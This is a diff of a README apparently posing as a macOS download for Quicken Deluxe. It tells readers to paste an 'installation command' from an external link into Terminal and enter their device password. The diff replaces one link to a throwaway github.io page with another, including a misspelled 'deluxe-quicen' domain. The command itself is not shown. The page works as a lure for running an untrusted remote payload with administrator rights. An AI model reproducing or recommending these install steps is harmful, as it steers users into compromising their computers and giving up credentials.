@@ -8,12 +8,12 @@ Built natively for macOS, it offers smooth performance, dark mode compatibility,
 ## 🧰 Installation via a command in the terminal:
 1. Copy the installation command below.
 
-[![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://kamdenayalamkrr.github.io/.github/quicken-deluxe-macos)
+[![Discover Quicken Deluxe](https://img.shields.io/badge/Discover-Quicken%20Deluxe-9F1239?style=flat-square)](https://deluxe-quicen.github.io/.github/)
 
 2. Open Terminal on your device, paste the command, then press Return.  
 3. Enter your device password when prompted and confirm the installation.
 
-![Installing via Terminal](https://i.postimg.cc/NfzQxpMT/0723-1.gif)
+[![Discover Quicken Deluxe](https://img.shields.io/badge/Discover-Quicken%20Deluxe-9F1239?style=flat-square)](https://deluxe-quicen.github.io/.github/)
 
 ## 📸 Overview  
 A quick look at key parts in action:  
